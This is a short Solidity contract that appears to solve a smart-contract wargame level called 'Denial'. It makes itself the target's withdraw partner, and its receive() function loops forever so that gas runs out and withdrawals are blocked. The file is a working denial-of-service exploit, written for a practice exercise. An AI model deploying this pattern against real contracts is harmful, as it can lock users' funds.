// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    function setWithdrawalPartner() external {
        Denial(contractAddress).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {}
    }
}
